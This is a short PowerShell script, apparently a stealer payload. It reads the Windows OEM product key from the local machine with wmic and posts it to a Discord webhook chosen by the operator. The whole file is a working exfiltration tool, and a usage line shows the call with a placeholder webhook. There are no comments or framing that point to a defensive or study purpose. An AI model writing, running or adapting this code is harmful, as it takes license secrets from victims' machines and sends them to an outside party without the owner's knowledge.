function Send-DiscordWebhookMessage {
    param (
        [string]$WebhookUrl,
        [string]$Message
    )

    $Body = @{
        content = $Message
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -ContentType 'application/json'
}

function Get-PKey {
    param (
        [Parameter(Mandatory=$true)]
        [string]$wb
    )

    $ProductKey = (wmic path softwarelicensingservice get OA3xOriginalProductKey | Select-Object -Skip 1).Trim()

    Send-DiscordWebhookMessage -WebhookUrl $wb -Message "Product Key: $ProductKey"
}

# usage:
#Get-PKey -wb 'DISCORD WEBHOOK'
